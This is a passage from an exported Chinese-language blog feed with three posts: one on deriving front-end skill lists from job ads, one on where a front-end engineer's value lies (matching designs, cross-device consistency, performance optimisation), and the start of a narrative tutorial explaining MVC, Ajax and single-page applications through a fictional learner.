href="#Git" class="headerlink" title="Git"></a>Git</h4><ol><li>基本使用 Git 能力</li><li>熟悉Git操作</li><li>熟悉 Git &#x2F; GitHub，包括但不限於分支操作、衝突解決及 Pull Requests。</li></ol><h4 id="CSS-相關"><a href="#CSS-相關" class="headerlink" title="CSS 相關"></a>CSS 相關</h4><ol><li>熟悉 Bootstrap 或其它 CSS Framework</li><li>SASS or postCSS</li></ol><h4 id="RWD"><a href="#RWD" class="headerlink" title="RWD"></a>RWD</h4><ol><li>Responsive Web Design 網站製作經驗</li><li>熟悉響應式設計，並有前端優化經驗</li></ol><h4 id="JavaScript-Framework"><a href="#JavaScript-Framework" class="headerlink" title="JavaScript Framework"></a>JavaScript Framework</h4><ol><li>至少精通一種Anguar.js、React.js、Vue.js或其他前端框架</li><li>使用過 React.js</li><li>瞭解 JavaScript &#x2F; ES6 特性及語法，懂得善用 JavaScript 框架或函式庫 (如 Angular.js &#x2F; React.js &#x2F; Vue.JS 等)</li></ol><h4 id="熟悉作業系統"><a href="#熟悉作業系統" class="headerlink" title="熟悉作業系統"></a>熟悉作業系統</h4><ol><li>熟悉 Mac os 或 Linux 系統尤佳。</li><li>工作環境使用並熟悉 Linux 或 macOS 作業系統。</li></ol><h4 id="溝通能力"><a href="#溝通能力" class="headerlink" title="溝通能力"></a>溝通能力</h4><ol><li>具團隊合作能力，分工合作完成交付之程式開發及維護</li><li>良好溝通能力，團隊配合度高</li><li>有良好溝通能力與異於常人的抗壓能力 ^.&lt;</li><li>良好的邏輯及溝通能力，當責不卸責。</li></ol><h3 id="加分項目-1"><a href="#加分項目-1" class="headerlink" title="加分項目"></a>加分項目</h3><h4 id="串接-API"><a href="#串接-API" class="headerlink" title="串接 API"></a>串接 API</h4><ol><li>運用 Ajax 串接第三方 API</li><li>具備 RESTful API 介接經驗</li></ol><h4 id="Git-1"><a href="#Git-1" class="headerlink" title="Git"></a>Git</h4><ol><li>Git 使用經驗</li><li>版本控管觀念(SVN or Git)</li></ol><h4 id="JavaScript-Framework-1"><a href="#JavaScript-Framework-1" class="headerlink" title="JavaScript Framework"></a>JavaScript Framework</h4><ol><li>AngularJS &#x2F; Node.js</li><li>有React.js,Node.js開發經驗</li></ol><h4 id="測試"><a href="#測試" class="headerlink" title="測試"></a>測試</h4><ol><li>熟悉前端測試</li><li>熟悉前端自動部署、測試及除錯。</li></ol><p>首先你會發現加分項目跟基本需求有兩項是重複的：Git 跟 JavaScript Framework，像是這種你就可以把它列入比較後期再來點的技能，先把大家都認為「必備」的技能點一點比較實在。</p><p>不過儘管這兩項被一些公司認為是 Nice to have，還是有很多公司認為是 Must have，所以一樣可以放入必點技能裡面（只是優先順序可以排後面一點）。</p><h3 id="最終統整"><a href="#最終統整" class="headerlink" title="最終統整"></a>最終統整</h3><p>你把上面重新再整理一下，按照出現的次數來排序，並且把加分項目刪掉，就會長這樣：</p><ol><li>熟悉 HTML5、CSS3、jQuery、Javascript</li><li>基本使用 Git 能力</li><li>良好溝通能力，團隊配合度高</li><li>懂得善用 JavaScript 框架或函式庫 (如 Angular.js &#x2F; React.js &#x2F; Vue.JS 等)</li><li>熟悉響應式設計</li><li>熟悉 Mac os 或 Linux 系統</li></ol><p>好了，你現在可以把上面的清單變成你努力的目標了<br>上面那八間的工作職缺告訴你說：只要你有上面這些技能，基本上就符合專業需求囉。</p><h3 id="關鍵字是有了，但怎樣叫做「熟悉」？"><a href="#關鍵字是有了，但怎樣叫做「熟悉」？" class="headerlink" title="關鍵字是有了，但怎樣叫做「熟悉」？"></a>關鍵字是有了，但怎樣叫做「熟悉」？</h3><p>沒錯，這個問題問得很好。大家只說要「熟悉 HTML5、CSS3、jQuery、Javascript」，但是怎樣算熟悉？</p><p>我做事的理念之一是：先求有，再求好，先來試試看不要到熟悉的程度，我們有「基本」的程度就好，那要怎樣才能有基本的程度？就考驗你 Google 的能力了！</p><p>「html 入門」、「css 入門教學」、「javascript 基礎」…<br>這種類似的關鍵字你就可以找到一大堆資料了，你把那些東西看一看學一學，你就有基礎了。</p><p>接下來就是從基礎到熟悉了，怎樣算熟悉？如果面試官問你的問題你都答得出來，這夠熟悉了吧！沒錯，就是這麼簡單，又是考驗你 Google 能力的時刻，「html 面試題」、「前端 面試」、「frontend interview」…</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>今天講的方法可以歸納成四個步驟：</p><ol><li>從一堆徵才文裡面找出必備技能跟加分技能，全部放在兩個列表裡面</li><li>從上述列表裡面找出重複次數特別高的，其他都刪掉</li><li>稍微分類一下，就有一份完美的必備技能清單了</li><li>開始學各項基礎</li><li>網路上找面試題，把自己的該項技能練到「熟悉」</li></ol><p>所以，不要再說什麼不知道要學什麼了，你只要 Google 一下徵才文，很快就能統整出這個職缺的必備技能；也不要再說不知道怎樣的程度才能踏入這個行業了，你 Google 一下面試題，看自己答不答的出來就知道了。</p><p>最後，祝大家都能找到自己想要的工作！</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端工程師的價值在哪？</title>
      <link href="/2018/06/03/value-of-fron-tend-1e047d4cb341/"/>
      <url>/2018/06/03/value-of-fron-tend-1e047d4cb341/</url>
      
        <content type="html"><![CDATA[<p>（原文發表於 <a href="http://huli.logdown.com/posts/1655457-front-end-engineer-where-is-the-value">Logdown</a>，重新檢視及改寫過後移植到這裡）</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>會寫出這篇是因為我一個朋友在 <a href="https://www.facebook.com/groups/f2e.tw/">Front-End Developers Taiwan</a> 裡面問了這個問題，<a href="https://www.facebook.com/groups/f2e.tw/permalink/1254841954553167/">完整原文</a>如下：</p><blockquote><p>誠心請問：前端工程師的價值在哪？<br>我是很想走前端、視覺、美感的人。但是一邊在路上，一邊卻不自主的質疑著這些東西的價值在哪？</p></blockquote><blockquote><p>比方說前端就是一些畫面、表單，boostrap 套一下或是用 Material UI 套一下，就變成 RWD。不夠的東西再自己用 CSS 手刻一下。<br>但大都時候不就是個畫面嗎？就算很醜好像也沒什麼人在意。”功能有出來、資料是對的就好了。”</p></blockquote><blockquote><p>目前我想到的是像 D3.js 這種視覺呈現，是後端做不出來的東西。除了這個還有其他價值嗎？</p></blockquote><blockquote><p>這是我想到的價值：<br>(1) 做畫面、用 RWD，讓各個裝置都能有對應畫面<br>(2) 如果載入時間太久，前端有責任透過微調，讓它的載入時間變短。<br>(3) 像 D3.js 那一類的視覺呈現。<br>一直想很問問大家，請問前端有什麼地方是價值所在？</p></blockquote><p>其實這個問題真的很有趣，因為從這個問題就可以看出大家對前端工程師的定義似乎都不太一樣，而這種根本性的差異也會導致答案不一樣。</p><p>以我說淺不淺說深不深的前端經驗來看，我認為前端工程師的價值可以區分為兩種，一種是<strong>核心價值</strong>、另外一種是<strong>附加價值</strong>。</p><h3 id="附加價值"><a href="#附加價值" class="headerlink" title="附加價值"></a>附加價值</h3><p>先從附加價值開始談起，這部分的價值屬於「跟其他職位的人溝通的專業度」。</p><p>首先，設計絕對不是前端工程師的核心價值，那是設計師的。使用者體驗也不是前端工程師的核心價值，那是使用者體驗設計師的。</p><p>可是前端工程師如果有設計的 sense 或是有 UX 的 sense，那當然是很不錯的一件事情，跟這兩個職位的人溝通起來也會比較流暢。</p><p>因此，我把這種價值稱為<strong>「附加價值」</strong>，而不是「核心價值」。</p><p>可能有人會問說：「可是有些公司的前端工程師還包設計包 UX 欸」，沒錯，但那是因為公司期望用一到兩個人的薪水聘到可以做三個人事情的強者，可是這種意義之下的前端工程師不在我這篇文章的討論範疇內。</p><p>這篇文章的前端工程師指的是<strong>「專門做前端」</strong>的工程師，意思就是不會要你去畫設計稿，也不會要你去弄一些有的沒的。</p><p>或者說得更清楚一點，就是在專業分工之下會有的前端工程師。在這種狀況下，設計稿會由設計師來負責，UX 也會有專門的人來負責，產品規格會有 PM 來負責，後端會有後端工程師來負責。</p><p>這就是我說的前端只專門做前端，其他領域他可以給建議、可以一起參與討論，但通常不太會有決定權。</p><h3 id="核心價值之一：工程師的價值"><a href="#核心價值之一：工程師的價值" class="headerlink" title="核心價值之一：工程師的價值"></a>核心價值之一：工程師的價值</h3><p>在前端工程師的核心價值裡面，也會包含兩種價值，因為前端工程師這個職位本來就是：<strong>前端 + 工程師</strong>兩個名詞組合起來的。所以有一部分是<strong>工程師的價值</strong>，另一個部分是<strong>前端的價值</strong>。</p><p>我們先來談談第一個部分：<strong>工程師的價值</strong>。要知道哪些是工程師的價值，而哪些又是前端的價值，只要把同樣的命題套用到「後端工程師」或是其他職位的工程師上面，看適不適用就對了。</p><p>例如說：「要選擇哪一套 Framework」這個問題，無論是前端工程師還是後端工程師都會碰到，所以顯然是<strong>工程師的價值</strong>。</p><p>但如果是：「要針對哪些瀏覽器做優化」，這個就顯然只跟前端有關（因為後端也碰不到瀏覽器），所以會歸類到<strong>前端的價值</strong>。</p><p>有關於工程師的價值，可以參考：<a href="http://jaceju.net/2016-12-24-be-a-senior-engineer/">接近 2016 年底的我是否有資格稱為資深工程師</a>。</p><h3 id="核心價值之二：前端的價值"><a href="#核心價值之二：前端的價值" class="headerlink" title="核心價值之二：前端的價值"></a>核心價值之二：前端的價值</h3><p>把附加價值跟工程師的價值談完以後，終於可以來談談只專屬於前端的價值了。</p><p>要知道前端工程師的價值在哪，可以用一個很簡單的問題來做區分：</p><blockquote><p>一個好的網站跟一個壞的網站差在哪裡？</p></blockquote><p>如果我們可以列的出差別，就知道前端工程師的價值體現在哪裡了。</p><p>但請注意這個差別並不是畫面美觀的差別，畫面美觀與否是設計師的事情，在這邊要先假設兩個網頁都是按照設計師的要求一模模一樣樣刻出來的。</p><p>而這也不會是網站好不好用的問題，「這按鈕太小按不到」、「這結帳流程太冗長」，這些都是 UX 的事情，在這邊先假設公司有一個 UX desinger 專門在做這些。</p><p>排除掉 UI 跟 UX 以後，壞的跟好的網站差在：</p><ol><li>一個壞的網站可能會在不同裝置上跑版，好的網站不會</li><li>一個壞的網站載入時間可能是 10 秒，好的網站只要 1 秒</li><li>一個壞的網站開場動畫很 lag，好的網站超級順</li></ol><p>當然，如果你再仔細一點列還可以列出更多，我這邊先簡單列出三點，但是就可以看到一些端倪了。</p><h3 id="前端是設計稿跟「現實」的橋樑"><a href="#前端是設計稿跟「現實」的橋樑" class="headerlink" title="前端是設計稿跟「現實」的橋樑"></a>前端是設計稿跟「現實」的橋樑</h3><p>一個網站的畫面<strong>「應該長得怎樣」</strong>，是設計師的事。可是網站<strong>「實際長得怎樣」</strong>，就是前端工程師的事情了。因為這就是前端工程師的工作內容嘛，負責把畫面顯示出來。</p><p>所以前端工程師的價值之一在於：<strong>「你對於設計稿的還原度有多高」</strong>，你該怎麼利用 HTML、CSS 與 JavaScript，把原本只是一張張圖片的設計稿，轉成在瀏覽器上面可以看到的介面？</p><p>除此之外，既然你是負責畫面顯示，就代表所有的載具你都應該要顧慮到，像是平板電腦、手機等等，必須保證在各個裝置上看到的網頁都跟設計師的設計稿長得一模一樣。</p><p>這難不難？靠北超級難啊！光是單位的選擇你可能就要思考很久了，<code>px</code>、 <code>pt</code>、<code>em</code>、<code>rem</code>、<code>vw</code>、<code>vh</code>、<code>vmin</code>，要用哪一種才能保證在各個裝置上看到的大小是差不多的？</p><p>還要考慮的是瀏覽器兼容性，有可能一個網頁在 Chrome 上看起來水噹噹，在 IE 上變成美丁美當，整個慘不忍睹。所以厲害的前端工程師知道各個瀏覽器之間的差異性，會盡可能確保在每一個瀏覽器上面看到的都是一樣的畫面。</p><p>這難不難？這也靠北難啊，每一個瀏覽器的實作都不同，有些很好用的 CSS 屬性在某些瀏覽器上面就是沒有，你能怎麼辦？</p><p>而且不要忘了，在這個 hybrid app 橫行的年代，你要支援的載具多了 iOS 跟 Android 的 Webview，又是兩個麻煩的東西。</p><p>這其實就像是專業的設計師在設計 Logo 的時候，需要考慮到 Logo 在各個地方的呈現，不只是網頁、文書，也有可能出現在衣服、杯子等等的東西上面，必須要一併考慮進去，設計出各個場景都能夠使用的 Logo。</p><p>前端既然是設計跟現實的橋樑，就代表也必須跟設計師溝通，在理想跟現實之間取得平衡。例如說設計師今天想要做一個超級酷炫的開場動畫，你也覺得這個超屌的啦做出來一定很猛，可是設計師跟你說他要用 Flash。</p><p>◢▆▅▄▃-崩╰(〒皿〒)╯潰-▃▄▅▆◣</p><p>大家都知道 Flash 已經是一個快死掉的東西了，瀏覽器慢慢在拋棄它，放上去之後說不定只有兩成的人看得到你屌炸天的開場動畫。那怎麼辦呢？一個專業的前端工程師會建議設計師可以用 HTML5 來做動畫，至少支援度會比 Flash 要來得高。</p><p>或者說如果動畫沒有很複雜，專業的前端也要有能力用 JavaScript 或者是 CSS Animation 做出來。</p><p>可是做出來是一回事，效能又是一回事，說不定 CSS 刻出來的動畫只有慘不忍睹的 20 fps，那怎麼辦？當然就是前端工程師要去調整，要去知道為什麼這邊會消耗那麼大的資源，要知道該怎麼樣去優化。</p><p>例如說要用 <code>transition</code> 的話就要知道同樣是讓元素左移 50px， <code>transform: translateX(-50x)</code>比<code>left: 0px</code>快得多，或是<code>backface-visibility: hidden</code>跟<code>transform: translate3d</code>也都對增進效能可能有幫助。也要知道有<code>will-change</code>這個屬性可以用。</p><p>那如果最後還是不行怎麼辦？就要站在專業的立場跟設計師說：「雖然我也很喜歡這動畫，但這個目前在網頁上真的不可能實現」之類的話。</p><p>好，講了這麼多，要表達的重點就是前端工程師的價值在於：「確保網站最大化的還原設計稿，並且在各個載具上的觀看體驗一致」。</p><h3 id="效能優化"><a href="#效能優化" class="headerlink" title="效能優化"></a>效能優化</h3><p>上面有提到說：一個壞的網站載入時間可能是 10 秒，好的網站只要 1 秒。</p><p>身為一個專業的前端工程師，你必須知道怎麼樣去調整網頁的效能，讓它更快 render、更快載入。這邊推薦給大家一堂 Google 的課：<a href="https://www.udacity.com/course/website-performance-optimization--ud884">Website Performance Optimization</a>，修了保證你物超所值，裡面介紹到怎麼利用 Chrome devtool 去檢視效能以及如何優化。</p><p>網頁載入速度怎麼會那麼慢呢？這邊先假設「載入速度」指的是「下載速度」好了，慢的原因有兩個：</p><ol><li>Request 下載數量太多</li><li>Request 回覆時間太久</li></ol><p>也就是下載速度快慢跟下載數量的問題，針對下載速度，有價值的工程師可以提出很多建議，例如說利用 Cache 把圖片存起來，下一次就可以大幅縮短下載時間，或者是利用 CDN 儲存圖片，速度也會變得比較快。或是會跟你說有 <a href="https://w3c.github.io/resource-hints/">Resource Hints</a> 可以用，也可以多少縮短一些時間。</p><p>那針對下載數量的問題，就可以考慮用 CSS Sprites 把圖片集中在一起，或者是用 Base64 直接把圖片寫在 CSS 裡面，就可以省一個 Request（但也要注意會增加檔案大小）。</p><p>講到圖片，有價值的前端應該也會知道 jpg、png、svg、gif 的異同以及應該用在哪裡，甚至是嘗試比較新的 webp 格式，這些也都是調整網頁效能的一部分。</p><p>所以在這個部分，前端工程師的價值就在於：「如何使網頁載入的速度變快、效能變好」。</p><p>這些也是我認為前端最困難但也是最有價值的一部分。因為這方面的優化是永無止盡的，永遠都可以想盡辦法讓你的網站變得再快一點點。而且時間優化了，有時候其他部分（程式碼可讀性、部署的難易度）卻被犧牲了，這也是很值得思考的一個點。</p><h3 id="你確定這些有價值？"><a href="#你確定這些有價值？" class="headerlink" title="你確定這些有價值？"></a>你確定這些有價值？</h3><p>有些價值是因人而異的，要看對象而定。</p><p>對一人當三人用的小公司來說，誰管你網頁從 2 秒變 1 秒，Request 從 20 個變 15 個，他們只管你能不能在最短的時間內自己畫設計稿、自己切版、自己把整個網站做完，讓他們好跟客戶交代。</p><p>在這種公司裡做前端，你的價值當然又會變得不一樣，價值取決於你能夠多快的把案子完成。但是我上面也說了，這種類型的前端工程師不是本文章所討論的範圍。</p><p>效能優化有價值嗎？當然有價值，尤其是你把規模放大的時候。</p><p>例如說我小時候年輕不懂事，js 跟 css 都不壓縮直接放上去，我們假設壓縮之後總共少了 10kb 好了，如果你的網頁一天有 1 萬個不重複瀏覽，就代表你一天節省的流量大約是 100 MB，一個月就大概節省了 3 GB！</p><p>聽起來滿多的吧！那如果像是臉書這種大公司，我們就假設一天有一千萬個不重複訪客好了，就算只有壓縮 1 kb，整體流量也少了 10GB。當你把規模放大的時候，很多細節都會變得重要起來。</p><p><strong>「魔鬼就藏在細節裡」</strong>，這句話是我最喜歡的至理名言之一，你去觀察很多專業跟業餘的差別，就會發現一樣都可以把事情完成，但價值卻體現在這些細節裡。</p><p>業餘的前端可以完成一個網頁，載入速度普通、乍看之下不跑版，一切都看似平常，可是專業的卻能把載入速度加快一倍，並且保證在各個裝置上面觀看都有最佳的體驗。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>來總結一下，我認為前端工程師「獨有」的價值如下：</p><p>1. 確保網站最大化的還原設計稿，並且在各個載具上的觀看體驗一致<br>2. 如何使網頁載入的速度變快、效能變好</p><p>至於那些什麼畫面美不美觀、使用者體驗好不好，我都覺得不是前端工程師真正的價值所在（所以我把它歸類在附加價值，但確實也是價值的一種）。在一個專業分工的地方，那些都會有其他人幫你做掉，前端只要專注在上面這兩點就好。</p><p>最後拉回開頭的原 po 的問題，我認為這跟所處的環境有關。在他那邊的環境，前端只需要套套 bootstrap，不需要特別優化網頁，也不用考慮在各個載具上的情況，只要在自己電腦跟同事電腦上面可以看就差不多了，所以自然會很疑惑前端的價值到底在哪。</p><p>就如同我前面提過的，對於不同人、不同場合可能會有不同的價值。而這篇文章在討論的是「專業分工底下的前端工程師」的價值。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR</title>
      <link href="/2018/05/05/introduction-mvc-spa-and-ssr-545c941669e9/"/>
      <url>/2018/05/05/introduction-mvc-spa-and-ssr-545c941669e9/</url>
      
        <content type="html"><![CDATA[<p>這篇的靈感來自於 <a href="https://www.facebook.com/groups/f2e.tw/permalink/1642690352434990/">Front-End Developers Taiwan</a> 裡面的一串討論，有人 po 了一個影片是來討論「MVC vs SPA」，這個標題一出來大家都驚呆了，想說怎麼會有這樣的比較，於是下面掀起一波激烈的討論，最後發現原 po 誤用了專有名詞，才導致這樣的結果。</p><p>雖然說很多技術名詞本來就是一個名詞各自表述，但基本概念通常都不會相差太遠，只有在細節上會有些許的爭議以及討論而已。</p><p>身為致力於要讓新手更容易搞懂技術名詞的人，不如就讓我來嘗試看看講解這幾個東西吧！</p><p>這篇文章的目標是：「只要你有網頁前端的基礎，就能夠搞懂我在說什麼」，如果你搞不懂的話，別擔心，不是你的錯，是我沒寫好。麻煩在下面留言一下讓我知道哪裡可以再改進。</p><p>接下來我會以主角小明為中心點出發，試著從一段虛擬的故事不斷帶出：「為什麼 XXX 會出現」、「為什麼我們需要 XXX」這些問題。如果你只對真實歷史的名詞演進有興趣，那你可能要去維基百科才能找到比較正確的資料。本故事純屬虛構，如有雷同…應該不太可能會有雷同啦，就讓我們開始吧！</p><p>（先打個預防針，故事有點長，如果這些概念你都理解了應該會覺得這篇文章超級廢又超級長）</p><h3 id="第一幕：在很久很久以前…"><a href="#第一幕：在很久很久以前…" class="headerlink" title="第一幕：在很久很久以前…"></a>第一幕：在很久很久以前…</h3><p>小明是一個初學程式的新手，在這之前有用 Dreamweaver 寫過一些簡單的靜態網頁，對 HTML、CSS 以及 JavaScript 都有一些基礎，而朋友們都推薦他去學 PHP 來補足後端的部分。</p><p>經過了一個月的苦練之後，小明終於完成了他的第一個後端程式，是一個非常簡單的留言板系統（怕大家傷眼睛，這邊只截給大家看其中一部分）</p><p><img src="/img/introduction-mvc-spa-and-ssr-545c941669e9/1__x__MTlP9rGt4W__ioGsWM1lw.png"></p><p>PHP 程式碼、商業邏輯、HTML，全部東西都混在一起做撒尿牛丸，寫了這樣的程式碼之後，小明每次考試都考一百分呢！</p><p>小明一開始覺得很興奮，自己終於能夠通曉前後端，成為全端工程師，便興沖沖的持續精進自己的後端技術，每天都加一個新的 feature 進去。過了兩個禮拜之後，小明整理了一下資料夾，發現總共有 100 個 PHP 檔案，每個檔案有超過 300 行 code，而且全部都是 PHP 跟 HTML 混在一起寫。</p><p>他隨便點開其中一個檔案，看了 10 秒之後大喊：</p><blockquote><p>我到底寫了三小</p></blockquote><p>意識到自己寫的 code 很爛，是邁向一個好的工程師的第一步。</p><h3 id="第二幕：痛改前非"><a href="#第二幕：痛改前非" class="headerlink" title="第二幕：痛改前非"></a>第二幕：痛改前非</h3><p>發現自己寫的程式碼連自己都看不懂的時候，小明覺得這樣不行，阿嶽也覺得不行，我也覺得不行。</p><p>因此呢，小明跑去十分瀑布下面打坐了三天三夜，不斷想著該怎麼樣讓他的程式碼變得更好，能夠更好維護、更好讀懂。他不求一步登天，只希望三個月之後當他回顧自己寫的 code 時，不要罵髒話就好。</p><p>就在第三天的晚上，他突然有了靈感，大喊了一聲：</p><blockquote><p>Eureka！</p></blockquote><p>就趕緊跑回家去重構自己的 code 了，而下面是他重構的結果：</p><p><img src="/img/introduction-mvc-spa-and-ssr-545c941669e9/1__Cia4vNN2yV2ALk__yLZswqQ.png"></p><p>這個範例跟之前差在哪邊呢？</p><p>首先，他把任何跟資料有關的操作都放到一個叫做 Model 的地方去，所以你要改任何跟資料有關的東西，都到那邊就對了。</p><p>再來，他也把所有跟顯示畫面有關的東西都放到其他地方去，我們就叫做 View 吧，View 裡面用一個 template 來塞入資料，不做任何跟資料有關的處理。</p><p>如此一來，他就把資料跟畫面顯示這兩者切開了，並且讓開頭那段 PHP code 把這兩者連接起來，先去 Model 拿資料，再把資料塞入 View 裡面輸出。那這個「連接兩者」的角色，就叫做 Controller 吧！</p><p>於是，MVC 就這樣出現了。為的就是要把原來亂七八糟的程式碼理出一個頭緒來，是你的就是你的，不是你的就給我滾遠點。你要存取資料庫就是去 Model 裡面，你要寫 HTML 就去 View，絕對不會出現在 View 裡面下 SQL Query 這種事情。</p><p>所以 MVC 是什麼？就是一種設計模式，你只要把你的 code 像這樣子切開，都可以叫做 MVC，所以你不可能只看一個畫面就跟你朋友說：「欸欸，這個網站是 MVC，因為他有好多個頁面」，除非你可以通靈看到背後程式碼的架構長什麼樣子。</p><p>話說後來又陸陸續續出現很多種模式，而且 MVC 其實也沒有想像中的職責這麼分明，在這邊我就不細講了，我自己對那整段歷史也沒有很熟，有興趣的可以參考：<a href="http://blog.turn.tw/?p=1539">MVC 是一個巨大誤會</a></p><p>然後我上面那段 code 是亂寫的，如果你對真實世界的 MVC 框架寫出來的 code 有興趣的話，會長成這樣：</p><p><img src="/img/introduction-mvc-spa-and-ssr-545c941669e9/1__vS7pUdfsJ9jHpPToZzO2Pw.png"></p><p>講到這裡我們做一個小總結，問自己三個問題：</p><ol><li>為什麼要有 MVC？</li><li>有 MVC 跟沒有 MVC 的差別在哪？</li><li>所以 MVC 是什麼？</li></ol><p>三個問題可以一起回答：</p><blockquote><p>因為小明寫的 code 太髒了太難維護，所以需要重構。而後來他發現用 Model、View、Controller 這三個概念來切的話可以把 code 寫得漂亮很多又好維護，就這樣做了。差別在於原本的 code 混在一起，遵守 MVC 的規範之後職責變得清楚很多。所以呢，MVC 就是一種架構，後端可以遵守 MVC 的架構去開發，前端也可以，就算不是 Web 也可以用 MVC。</p></blockquote><h3 id="第三幕：毛很多的使用者"><a href="#第三幕：毛很多的使用者" class="headerlink" title="第三幕：毛很多的使用者"></a>第三幕：毛很多的使用者</h3><p>小明把自己的爛 code 利用 MVC 模式重構之後，看起來還挺不賴的，至少比以前好很多，三個月過去了，也能看得懂自己以前寫的 code。把留言板的程式碼重構得差不多之後，小明決定把這個專案公開，開放給大家註冊使用，讓每個人都可以有自己的留言板。</p><p>一開始狀況都還行，大家紛紛感激小明的無私奉獻，「祝樓主一生平安」、「感謝大大無私的分享」，可是好景不常，有天小明收到了一個回饋：</p><blockquote><p>我每次留言之後頁面都會刷新，我家網速又慢，每次都要等個十幾秒，有沒有可能不要重新整理頁面？你看人家 Gmail，我寄完信它也沒有重新整理啊！人家做得到你應該也做得到吧</p></blockquote><p>身為一個濫好人，小明乖乖的去研究 Gmail 到底是如何做到的，發現秘訣就在於一個神奇的東西：Ajax，全名 Asynchronous JavaScript and XML。</p><p>全名聽起來很嚇人，但說穿了其實就是你在 JavaScript 裡面可以非同步的去呼叫 Server 的 API 並且拿資料回來，在 Ajax 出現之前，你要把資料帶過去都必須透過 Form 的方式，一定要換頁。可是有了 Ajax 以後，不換頁也能跟 Server 溝通。</p><p>Gmail 就是利用這樣的原理，才能達成寄信不換頁。</p><p>小明研究了一個假日之後便著手改造自己的留言板，把原本利用 Form 發送留言的地方變成 Ajax，可是他碰到了一個問題：</p><blockquote><p>原本我新增留言之後重新整理頁面就可以看到新的留言了，因為 Server 會把最新的結果傳回去；可是我現在用 Ajax，我要怎麼在不刷新頁面的前提下在畫面上新增留言？</p></blockquote><p>總而言之呢，利用 Ajax 之後的確是發了一個 Request 跟 Server 說你要新增留言，也成功了，可是畫面上不會平白無故就跑出一個新的留言。在經過短暫的思考後，小明得到一個很直覺的解法：「阿我就用 JavaScript 來新增就好啦！」</p><p>經過一番修改之後，新增留言的程式碼從原本很簡單的一個 Form 表單，變成下面這個樣子：</p><p><img src="/img/introduction-mvc-spa-and-ssr-545c941669e9/1__7Cpm59gTbiTw48gbHBwz__Q.png"></p><p>使用者的需求被解決了，小明也有了技術上的成長，可謂是一石二鳥、一舉兩得，但小明天真的地方就在於他把使用者想得太簡單了。</p><p>過了一個禮拜之後，同一個使用者又寫信給小明：</p><blockquote><p>很感謝你上次新增的功能，可是我有個疑問。我看 Gmail 無論做什麼操作都不會換頁，你的留言板也可以改成這樣嗎？這樣比較方便，謝謝。</p></blockquote><p>濫好人小明沒有仔細深究「比較方便」到底是怎樣的方便，純粹站在一個希望滿足使用者所有需求的角度跳下去研究 Gmail 到底還能夠做到什麼。</p><p>他發現了 Gmail 跟其他網站不同的地方就是：「無論做什麼操作都不會換頁」，換頁指的是「你會有一段時間看到整個畫面全白，因為瀏覽器正在等待 Server 的 Response 才能載入 HTML」。</p><p>你在用 Gmail 的時候，無論你是寫信、讀信、整理信件或是切換到設定頁，儘管你的網路跟烏龜一樣，你還是看不到任何全白畫面。</p><p>為什麼？因為 Gmail 所有跟 Server 溝通的地方都是用 Ajax。</p><p>這是改造前的範例，我們利用表單 POST 來新增一筆留言，所以你會看到一小段的白畫面：</p><p><img src="/img/introduction-mvc-spa-and-ssr-545c941669e9/1__usRjA5fgHT7mkVgYGYgDOw.gif"></p><p>這是改造後的範例，因為我們用 Ajax 來新增留言的關係，所以你不會看到任何白畫面的出現，使用者體驗好很多：</p><p><img src="/img/introduction-mvc-spa-and-ssr-545c941669e9/1__iz2o4r4oEdHhAsuQaFqNeQ.gif"></p><p>我們再舉一個簡單的小例子，假設小明今天寫了一個沒有用 Ajax 的 Minmail，他刪除一封信的流程是這樣的：</p><ol><li>點擊刪除之後，利用 Form 表單 POST 資料去 &#x2F;server&#x2F;delete_email</li><li>&#x2F;server&#x2F;delete_email 處理完之後 redirect 回去信件列表</li><li>瀏覽器重新載入信件列表（在載入之前你都會看到全白畫面）</li></ol><p>可是如果是像 Gmail 那樣子全部改成 Ajax 的話，就會變成：</p><ol><li>點擊刪除之後，利用 Ajax POST 資料去 &#x2F;server&#x2F;api&#x2F;delete_email</li><li>&#x2F;server&#x2F;api&#x2F;delete_email 處理完之後回傳 Response</li><li>利用 JavaScript 在前端把那封信的從畫面上移除</li></ol><p>後者利用 Ajax 跟後端同步資料，並且在前端用 JavaScript 更改畫面，所以你無論做什麼操作都不會換頁，也可以保證前後端的資料是同步的。</p><p>知道區別以及原理之後，小明把整個網站都改造成這種形式，只要是任何原本用到 Form 的地方，現在全部都用 Ajax 拿資料並搭配 JavaScript 來做畫面上的處理。</p><p>因此，留言列表現在變成 Ajax 拿資料回來之後由 JavaScript 把留言 append 到畫面上，就像我們剛剛示範的新增留言那樣。</p><p>此時，小明突然有個非常驚人的發現：</p><blockquote><p>咦，如果我全部畫面都是由前端利用 JavaScript 動態產生的話，那我原本後端的 View  要幹嘛？</p></blockquote><p>咦，對啊，既然現在所有畫面都是在前端由 JavaScript 動態產生，那我後端不就永遠都輸出同一個檔案就好？如此一來，使用者看到的其實都是<strong>同一個頁面</strong>，而我們利用 JavaScript 在這個頁面上做變化。</p><p>這個概念就叫做 SPA，全名是 Single Page Application，單頁式應用。與之對應的概念是 MPA，Multiple Page Application。</p><p><img src="/img/introduction-mvc-spa-and-ssr-545c941669e9/1__M4Il9f__myqCnqDmfL__sjPw.png"></p><p>就如同小明領悟的一樣，前端如果利用 SPA 來實作的話，會把原本應該是後端處理的一部份職責給搬到前端去，例如說狀態的管理跟路由。</p><p>舉例來說，在以往 Server 根據不同的路徑對應到不同的 Controller，進而渲染出不同的 View。可是現在 Server 無論什麼路徑都會輸出同一個檔案，所以你在前端也要判斷現在的網址是哪個，才能決定在前端應該渲染出哪個畫面。</p><p>再舉一個例子，假設我現在寫了一個電影列表的網站，首頁列出許多熱門電影，點進去可以看到個別電影的詳細資料。而我們做了以下動作：</p><ol><li>點進電影 A</li><li>快速按上一頁</li><li>快速點進電影 B</li></ol><p>如果是 SPA 的話，實作的邏輯應該會是：「點進單獨電影時發送一個 Request，等 Response 回來之後把資料顯示在畫面上」，乍聽之下沒什麼問題，但若是你在第三步的時候，第一步所發出去的電影 A 的 Response 才傳回來，你的畫面就會顯示出電影 A 的資訊，可是使用者點的明明就是電影 